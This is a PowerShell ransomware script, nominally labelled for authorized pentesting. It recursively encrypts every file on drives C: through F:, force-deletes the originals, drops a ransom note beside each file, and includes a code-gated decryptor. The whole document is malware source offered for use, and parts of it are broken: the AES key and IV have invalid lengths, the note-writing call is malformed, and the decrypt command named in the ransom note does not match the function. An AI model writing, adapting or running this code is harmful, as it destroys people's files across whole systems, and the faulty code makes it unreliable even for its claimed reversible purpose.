# RANSOMWARE-ULTIMATE.ps1 - TOTAL SYSTEM ENCRYPTION
# Encrypts EVERY file on target drives - Authorized Pentest Only
# Decrypt code: 301211

param(
    [string[]]$Drives = @("C:", "D:", "E:", "F:"),  # All mounted drives
    [string]$DecryptCode = "301211",
    [string]$ReportPath = "C:\Windows\pentest_ransomware_report.txt",
    [switch]$NoSizeLimit  # Remove 50MB cap
)

Write-Host "💀 TOTAL SYSTEM ENCRYPTOR DEPLOYED`nDrives: $($Drives -join ', ')`nCode: $DecryptCode`nEVERY FILE TARGETED" -ForegroundColor Red

# Strong AES-256 key for pentest
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes("ThisIs32ByteKeyForPentestAuthOnly123456")
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes("16ByteIVForPentesting")

$aesProvider = [System.Security.Cryptography.Aes]::Create()
$aesProvider.Key = $keyBytes
$aesProvider.IV = $ivBytes

$totalEncrypted = 0
$skipped = 0
$startTime = Get-Date
$logEntries = @()

Write-Host "Scanning drives for ALL files..." -ForegroundColor Yellow

# ENCRYPT EVERY SINGLE FILE
foreach ($drive in $Drives) {
    if (Test-Path $drive) {
        Write-Host "🔍 Processing $drive ..." -ForegroundColor Cyan
        
        Get-ChildItem -Path $drive -Recurse -Force -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSIsContainer -eq $false } | 
        ForEach-Object {
            $file = $_
            $relativePath = $file.FullName -replace [regex]::Escape($drive), ""
            
            # Skip if already encrypted or ransom note
            if ($file.Extension -in @('.encrypted', '.RANSOM.txt')) { 
                $skipped++
                return 
            }
            
            try {
                # ENCRYPTION
                $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $encryptor = $aesProvider.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
                $encryptor.Dispose()
                
                # Write encrypted file
                $encryptedFile = "$($file.FullName).encrypted"
                [System.IO.File]::WriteAllBytes($encryptedFile, $encryptedBytes)
                
                # Hide original
                Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
                
                # Deploy ransom note
                $ransomNote = @"
🚨 AUTHORIZED PENTEST RANSOMWARE 🚨

ORIGINAL FILE: $relativePath
STATUS: FULLY ENCRYPTED (AES-256)

DECRYPTION CODE: 301211

Run: Invoke-DecryptAll -Code '301211'

Pentest Report: $ReportPath
Engagement: Authorized Red Team Operation
NO DATA LOST - FULLY REVERSIBLE
"@
                "$($file.FullName).RANSOM.txt" | Out-File -InputObject $ransomNote -Encoding UTF8
                
                $totalEncrypted++
                $logEntries += "ENCRYPTED: $relativePath ($([math]::Round($file.Length/1MB,2))MB)"
                
                if ($totalEncrypted % 100 -eq 0) {
                    $elapsed = (Get-Date) - $startTime
                    Write-Host "🔐 $totalEncrypted files | $([math]::Round($elapsed.TotalMinutes))m | $(([math]::Round(($totalEncrypted*($file.Length/1MB))/1024,1))GB processed)" -ForegroundColor Green
                }
                
            } catch {
                $skipped++
                $logEntries += "SKIPPED (error): $($file.FullName) - $_"
            }
        }
    }
}

# ADVANCED DECRYPTOR (CODE-PROTECTED)
function Invoke-TotalDecrypt {
    param([string]$Code)
    
    if ($Code -ne $DecryptCode) {
        Write-Host "❌ ACCESS DENIED - Wrong code: $Code" -ForegroundColor Red
        return
    }
    
    Write-Host "✅ FULL SYSTEM DECRYPTION AUTHORIZED" -ForegroundColor Green
    
    $aesProvider.Key = $keyBytes
    $aesProvider.IV = $ivBytes
    
    $decrypted = 0
    Get-ChildItem -Path $Drives -Recurse -Filter "*.encrypted" -Force -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $encryptedBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            $decryptor = $aesProvider.CreateDecryptor()
            $originalBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
            $decryptor.Dispose()
            
            # Restore original name
            $originalPath = $_.FullName -replace '\.encrypted$', ''
            [System.IO.File]::WriteAllBytes($originalPath, $originalBytes)
            
            # Cleanup markers
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            "$originalPath.RANSOM.txt" | Remove-Item -Force -ErrorAction SilentlyContinue
            
            $decrypted++
            if ($decrypted % 100 -eq 0) {
                Write-Host "🔓 $decrypted restored..." -ForegroundColor Cyan
            }
        } catch {
            Write-Warning "Decrypt failed: $($_.Name)"
        }
    }
    
    Write-Host "✅ DECRYPTION COMPLETE: $decrypted files restored" -ForegroundColor Green
}

